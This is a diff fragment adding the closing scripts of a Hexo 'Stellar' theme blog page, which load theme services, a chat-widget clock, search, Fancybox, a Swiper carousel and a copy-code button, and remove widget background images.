+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div><!-- hexo injector body_end start -->
+<script>
+  // JS Kill Switch: Remove any remaining background images in widgets
+  document.addEventListener("DOMContentLoaded", function() {
+    // 1. Target obvious cover classes
+    const covers = document.querySelectorAll('.widget-wrapper .cover, .widget-wrapper .widget-header, .layout-author .cover');
+    covers.forEach(el => {
+      el.style.backgroundImage = 'none';
+      el.style.background = 'transparent';
+    });
+    
+    // 2. Target ANY div inside a widget that has a background-image inline style
+    const allDivs = document.querySelectorAll('.widget-wrapper div');
+    allDivs.forEach(el => {
+      if (el.style.backgroundImage && el.style.backgroundImage !== 'none') {
+        el.style.backgroundImage = 'none';
+        el.style.background = 'transparent';
+      }
+    });
+  });
+</script>
+<!-- hexo injector body_end end --></body></html>
